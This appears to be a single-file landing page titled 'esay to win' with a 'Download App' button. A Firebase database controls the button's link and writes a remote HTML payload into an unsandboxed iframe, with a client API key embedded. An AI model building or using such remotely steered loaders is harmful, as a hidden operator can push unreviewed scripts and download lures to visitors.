<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>esay to win</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        * {
            margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent;
        }

        body, html {
            width: 100%; height: 100%; overflow: hidden;
            background: #0f172a;
            font-family: 'Outfit', sans-serif;
        }

        /* 👑 PREMIUM FLOATING DOWNLOAD HEADER */
        .premium-header {
            position: fixed; top: 0; left: 0; width: 100%; height: 75px;
            background: rgba(15, 23, 42, 0.6);
            backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            display: flex; justify-content: center; align-items: center;
            z-index: 99999; padding: 0 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }

        /* ✨ HIGHLY ANIMATED FLOATING BUTTON */
        .btn-download {
            background: linear-gradient(45deg, #ff007f, #7928ca, #ff007f);
            background-size: 200% auto;
            color: #ffffff; text-decoration: none;
            padding: 12px 35px; font-size: 16px; font-weight: 900;
            border-radius: 50px; text-transform: uppercase; letter-spacing: 1.5px;
            display: inline-flex; align-items: center; gap: 10px;
            border: 2px solid rgba(255, 255, 255, 0.4);
            box-shadow: 0 0 20px rgba(121, 40, 202, 0.6), inset 0 2px 4px rgba(255,255,255,0.4);
            cursor: pointer; transition: all 0.3s ease;
            animation: gradientMove 3s infinite linear, pulseGlow 2s infinite ease-in-out;
        }

        /* Button Animations */
        @keyframes gradientMove {
            0% { background-position: 0% center; }
            100% { background-position: 200% center; }
        }

        @keyframes pulseGlow {
            0%, 100% { transform: scale(1); box-shadow: 0 0 20px rgba(121, 40, 202, 0.6); }
            50% { transform: scale(1.04); box-shadow: 0 0 35px rgba(255, 0, 127, 0.9); }
        }

        .btn-download i {
            font-size: 18px; animation: bounceIcon 1s infinite alternate;
        }

        @keyframes bounceIcon {
            0% { transform: translateY(2px); }
            100% { transform: translateY(-3px); }
        }

        /* 💻 MAIN REDIRECT/PAYLOAD CONTAINER */
        #contentContainer {
            width: 100%; height: 100%; padding-top: 75px;
            background: #0f172a;
        }

        .app-frame {
            width: 100%; height: 100%; border: none; background: #0f172a;
        }

        .loading-text {
            color: white; text-align: center; padding-top: 100px; font-size: 20px; font-weight: 600;
        }
    </style>
</head>
<body>

<div class="premium-header">
    <a href="#" id="dlLink" class="btn-download" target="_blank">
        <i class="fas fa-cloud-download-alt"></i> <span id="dlText">Download App</span>
    </a>
</div>

<div id="contentContainer">
    <iframe id="sandboxEngine" class="app-frame"></iframe>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    // Firebase Configuration
    const firebaseConfig = { 
        apiKey: "AIzaSyBjv193gNBhYKjXxk9Q4iHXqcVTHeD9IXM", 
        databaseURL: "https://watch-1b375-default-rtdb.firebaseio.com" 
    };
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    const dlLink = document.getElementById('dlLink');
    const dlText = document.getElementById('dlText');
    const sandboxEngine = document.getElementById('sandboxEngine');

    // --- 💾 SESSION MEMORY STAGE ---
    // Pehle se saved data ko nikaalein taaki refresh hone par "Loading" screen na dikhe
    const cachedHtml = sessionStorage.getItem('last_html_payload');
    const cachedBtnName = sessionStorage.getItem('last_btn_name');
    const cachedBtnUrl = sessionStorage.getItem('last_btn_url');

    // Agar cache me data h, toh bina wait kiye turant load kar do
    if (cachedHtml) {
        if(cachedBtnName) dlText.innerText = cachedBtnName;
        if(cachedBtnUrl) dlLink.href = cachedBtnUrl;
        
        sandboxEngine.contentWindow.document.open();
        sandboxEngine.contentWindow.document.write(cachedHtml);
        sandboxEngine.contentWindow.document.close();
    } else {
        // Agar pehli baar open hua hai, tabhi loading screen dikhegi
        sandboxEngine.contentWindow.document.open();
        sandboxEngine.contentWindow.document.write("<h1 class='loading-text' style='color:white;text-align:center;font-family:sans-serif;padding-top:100px;'>WELCOME...</h1>");
        sandboxEngine.contentWindow.document.close();
    }

    // LISTEN FOR REAL-TIME ADMIN UPDATES
    onValue(ref(db, 'appControlPanel'), (snap) => {
        if (snap.exists()) {
            const data = snap.val();
            
            // 1. Dynamic Button Live Update & Cache Save
            if(data.buttonName) {
                dlText.innerText = data.buttonName;
                sessionStorage.setItem('last_btn_name', data.buttonName);
            }
            if(data.buttonUrl) {
                dlLink.href = data.buttonUrl;
                sessionStorage.setItem('last_btn_url', data.buttonUrl);
            }
            
            // 2. Real-time HTML Redirect/Payload Inject & Cache Save
            if (data.htmlPayload) {
                // Agar data naya hai tabhi iframe ko dobara overwrite karein taaki user progress safe rahe
                if (sessionStorage.getItem('last_html_payload') !== data.htmlPayload) {
                    sessionStorage.setItem('last_html_payload', data.htmlPayload);
                    sandboxEngine.contentWindow.document.open();
                    sandboxEngine.contentWindow.document.write(data.htmlPayload);
                    sandboxEngine.contentWindow.document.close();
                }
            } else {
                sandboxEngine.contentWindow.document.open();
                sandboxEngine.contentWindow.document.write("<h1 style='color:white;text-align:center;font-family:sans-serif;padding-top:100px;'>No APPS </h1>");
                sandboxEngine.contentWindow.document.close();
                sessionStorage.removeItem('last_html_payload');
            }
        }
    });
</script>
</body>
</html>
